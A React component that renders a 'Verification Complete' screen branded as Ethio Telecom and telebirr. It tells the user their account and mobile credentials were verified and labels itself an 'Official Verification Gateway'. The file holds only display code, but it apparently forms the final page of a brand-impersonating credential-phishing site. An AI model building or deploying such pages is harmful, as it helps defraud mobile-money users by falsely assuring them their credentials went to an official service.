'use client';

import React from 'react';
import { Check, ShieldCheck } from 'lucide-react';
import { Translation } from '@/lib/telebirr-translations';
import { EthioTelecomLogo } from './EthioTelecomLogo';
import { TelebirrLogo } from './TelebirrLogo';

interface AccountDashboardProps {
  phoneNumber: string;
  t: Translation;
  onLogout: () => void;
}

export function AccountDashboard({
  phoneNumber,
  onLogout,
}: AccountDashboardProps) {
  const currentDate = new Date().toLocaleDateString('en-US', {
    month: 'short',
    day: 'numeric',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });

  return (
    <div
      id="verification-complete-container"
      className="w-full max-w-md mx-auto p-4 sm:p-6 animate-in fade-in zoom-in-95 duration-300"
    >
      <div className="bg-white/95 backdrop-blur-md rounded-3xl shadow-xl sm:shadow-2xl border border-slate-200/90 p-8 sm:p-10 text-center relative overflow-hidden">
        {/* Brand Logos Header */}
        <div className="flex items-center justify-between pb-6 mb-6 border-b border-slate-100">
          <EthioTelecomLogo size="sm" />
          <div className="h-5 w-px bg-slate-200" aria-hidden="true" />
          <TelebirrLogo size="sm" />
        </div>

        {/* Animated Checkmark Circle */}
        <div className="flex justify-center mb-5">
          <div className="relative">
            <div className="w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-emerald-50 border-2 border-emerald-500/30 flex items-center justify-center shadow-md">
              <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-full bg-[#6aa828] text-white flex items-center justify-center shadow-lg">
                <Check className="w-8 h-8 sm:w-9 sm:h-9 stroke-[3]" />
              </div>
            </div>
            {/* Subtle glow effect behind the badge */}
            <div
              className="absolute inset-0 rounded-full bg-emerald-400/20 blur-xl -z-10"
              aria-hidden="true"
            />
          </div>
        </div>

        {/* Main Title & Status */}
        <h2 className="text-2xl sm:text-3xl font-extrabold text-slate-900 tracking-tight mb-2">
          Verification Complete
        </h2>
        <p className="text-sm text-slate-500 max-w-xs mx-auto leading-relaxed mb-6">
          Your telebirr account and mobile credentials have been verified successfully.
        </p>

        {/* Verification Details Box */}
        <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200/80 text-left space-y-2.5 mb-6 text-xs">
          <div className="flex items-center justify-between">
            <span className="text-slate-500 font-medium">Mobile Number</span>
            <span className="font-bold text-slate-900 font-mono">+251 {phoneNumber}</span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-slate-500 font-medium">Status</span>
            <span className="inline-flex items-center gap-1.5 font-bold text-emerald-700 bg-emerald-100/70 px-2 py-0.5 rounded-full">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-600 animate-pulse" />
              Verified & Active
            </span>
          </div>
          <div className="flex items-center justify-between">
            <span className="text-slate-500 font-medium">Verified On</span>
            <span className="text-slate-600">{currentDate}</span>
          </div>
        </div>

        {/* Action Button: Finish */}
        <button
          type="button"
          id="finish-verification-button"
          onClick={onLogout}
          className="w-full py-3.5 px-4 bg-[#0077c8] hover:bg-[#006cb8] active:bg-[#005fa0] text-white font-bold rounded-xl shadow-md transition-colors flex items-center justify-center gap-2 cursor-pointer text-sm"
        >
          <Check className="w-4 h-4" />
          <span>Finish</span>
        </button>

        {/* Security Seal */}
        <div className="mt-6 pt-4 border-t border-slate-100 text-center">
          <div className="inline-flex items-center gap-1.5 text-[11px] font-medium text-slate-400">
            <ShieldCheck className="w-3.5 h-3.5 text-[#6aa828]" />
            <span>Ethio telecom • telebirr Official Verification Gateway</span>
          </div>
        </div>
      </div>
    </div>
  );
}

